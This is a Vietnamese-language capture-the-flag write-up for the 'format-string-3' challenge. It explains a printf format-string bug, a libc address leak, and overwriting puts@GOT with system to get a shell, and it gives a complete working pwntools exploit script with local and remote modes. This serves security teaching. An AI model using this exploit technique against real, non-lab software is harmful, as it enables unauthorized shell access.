# format-string-3 Writeup

## 1. Thông tin bài

Bài cho 4 file chính:

```text
format-string-3      # file thực thi
format-string-3.c    # source code
libc.so.6            # libc được dùng bởi bài
ld-linux-x86-64.so.2 # linker/interpreter đi kèm
```

Chương trình là ELF 64-bit, dynamically linked và dùng interpreter `./ld-linux-x86-64.so.2`.

```bash
file ./format-string-3
```

Kết quả dạng:

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter ./ld-linux-x86-64.so.2, not stripped
```

Các điểm bảo vệ quan trọng:

```text
PIE: No PIE
RELRO: Partial RELRO
Canary: có canary
NX: enabled
```

Trong bài này mình không cần đụng tới return address nên canary không quan trọng. Điểm quan trọng là chương trình **No PIE** và **Partial RELRO**, nên địa chỉ GOT cố định và có thể ghi đè được.

---

## 2. Phân tích source code

Source chính:

```c
char *normal_string = "/bin/sh";

void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();

    fgets(buf, 1024, stdin);
    printf(buf);

    puts(normal_string);

    return 0;
}
```

Có 3 điểm rất quan trọng:

### 2.1. Chương trình có sẵn chuỗi `/bin/sh`

```c
char *normal_string = "/bin/sh";
```

Cuối chương trình có dòng:

```c
puts(normal_string);
```

Tức là sau khi xử lý input của mình, chương trình sẽ gọi:

```c
puts("/bin/sh");
```

Nếu mình ghi đè GOT của `puts` thành địa chỉ `system`, thì dòng trên sẽ biến thành:

```c
system("/bin/sh");
```

Khi đó ta lấy được shell.

---

### 2.2. Chương trình leak địa chỉ libc

Trong hàm `hello()`:

```c
printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
```

Khi chạy chương trình, nó in ra địa chỉ thật của `setvbuf` trong libc, ví dụ:

```text
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f6da58073f0
```

Vì địa chỉ libc bị random do ASLR, ta dùng leak này để tính libc base:

```python
libc_base = leaked_setvbuf - libc.symbols["setvbuf"]
```

Sau đó tính địa chỉ thật của `system`:

```python
system_addr = libc_base + libc.symbols["system"]
```

Với libc được cho:

```text
setvbuf offset = 0x7a3f0
system  offset = 0x4f760
/bin/sh offset  = 0x19ae34
```

Thật ra bài này không cần dùng offset `/bin/sh` trong libc, vì binary đã có sẵn chuỗi `/bin/sh` ở biến `normal_string`.

---

### 2.3. Lỗi format string

Đoạn lỗi nằm ở đây:

```c
fgets(buf, 1024, stdin);
printf(buf);
```

Đáng lẽ phải viết an toàn như sau:

```c
printf("%s", buf);
```

Nhưng chương trình lại truyền trực tiếp input của mình vào `printf`. Vì vậy mình có lỗi **format string**.

Với lỗi này, ta có thể dùng:

```text
%p  # leak dữ liệu trên stack
%n  # ghi số byte đã in vào một địa chỉ
```

Mục tiêu là dùng `%n` để ghi đè `puts@GOT` thành `system`.

---

## 3. Tìm offset của input trên stack

Test bằng payload:

```bash
python3 -c 'print("AAAA." + ".%p"*80)' | ./format-string-3
```

Trong output sẽ thấy đoạn giống như:

```text
0x70252e2e41414141
```

Giải thích:

```text
41 41 41 41 = AAAA
2e = dấu .
25 70 = %p
```

Do máy x86-64 dùng little-endian nên chuỗi `AAAA..%p` hiện ra đảo byte thành:

```text
0x70252e2e41414141
```

Quan sát output cho thấy input của mình bắt đầu xuất hiện ở argument thứ **38**.

Vậy format string offset là:

```python
offset = 38
```

Offset này sẽ được dùng trong `fmtstr_payload()`.

---

## 4. Tìm địa chỉ GOT cần ghi đè

Dùng `readelf`:

```bash
readelf -r ./format-string-3 | grep puts
```

Kết quả:

```text
000000404018  R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

Vậy:

```python
puts_got = 0x404018
```

Do binary **No PIE**, địa chỉ này không đổi giữa các lần chạy.

Ý tưởng exploit:

```text
puts@GOT = system
```

Sau đó chương trình tự chạy:

```c
puts(normal_string);
```

Nhưng vì `puts` đã bị đổi thành `system`, lệnh thực tế là:

```c
system("/bin/sh");
```

---

## 5. Exploit hoàn chỉnh

Tạo file `solve.py`:

```python
from pwn import *

context.binary = exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")

HOST = "saturn.picoctf.net"
PORT = 12345

OFFSET = 38


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        # Dùng đúng ld và libc bài cho để tránh lệch libc
        return process([
            "./ld-linux-x86-64.so.2",
            "--library-path", ".",
            "./format-string-3"
        ])


io = start()

# Nhận dòng leak setvbuf
io.recvuntil(b"setvbuf in libc: ")
leaked_setvbuf = int(io.recvline().strip(), 16)
log.info(f"leaked setvbuf = {hex(leaked_setvbuf)}")

# Tính libc base và system
libc.address = leaked_setvbuf - libc.symbols["setvbuf"]
log.info(f"libc base = {hex(libc.address)}")
log.info(f"system = {hex(libc.symbols['system'])}")

# Ghi đè puts@GOT thành system
payload = fmtstr_payload(
    OFFSET,
    {
        exe.got["puts"]: libc.symbols["system"]
    },
    write_size="short"
)

io.sendline(payload)

# Sau printf(buf), chương trình gọi puts("/bin/sh")
# Nhưng puts đã thành system, nên ta có shell
io.interactive()
```

---

## 6. Chạy local

Cấp quyền thực thi:

```bash
chmod +x ./format-string-3
chmod +x ./ld-linux-x86-64.so.2
```

Chạy exploit local:

```bash
python3 solve.py
```

Nếu thành công, chương trình sẽ gọi:

```text
system("/bin/sh")
```

Sau đó có thể test shell bằng:

```bash
id
ls
cat flag.txt
```

---

## 7. Chạy remote

Sửa lại `HOST` và `PORT` đúng với server của bài:

```python
HOST = "địa_chỉ_server"
PORT = 12345
```

Sau đó chạy:

```bash
python3 solve.py REMOTE
```

Khi vào shell:

```bash
cat flag.txt
```

---

## 8. Tóm tắt hướng giải

Luồng khai thác của bài:

```text
1. Chương trình leak địa chỉ setvbuf trong libc.
2. Từ leak setvbuf, tính libc base.
3. Từ libc base, tính địa chỉ system.
4. Tìm format string offset là 38.
5. Tìm puts@GOT = 0x404018.
6. Dùng format string ghi puts@GOT = system.
7. Chương trình tự gọi puts("/bin/sh").
8. Vì puts đã bị đổi thành system, ta nhận được shell.
```

Công thức chính:

```python
libc_base = leaked_setvbuf - libc.symbols["setvbuf"]
system_addr = libc_base + libc.symbols["system"]
```

Payload chính:

```python
payload = fmtstr_payload(38, {exe.got["puts"]: libc.symbols["system"]}, write_size="short")
```

---

## 9. Lưu ý quan trọng

Không cần overwrite return address vì chương trình đã có sẵn một lời gọi rất đẹp:

```c
puts(normal_string);
```

Mà `normal_string` lại là:

```c
"/bin/sh"
```

Vì vậy cách gọn nhất là ghi đè `puts@GOT` thành `system`. Đây là kiểu khai thác format string kết hợp GOT overwrite.

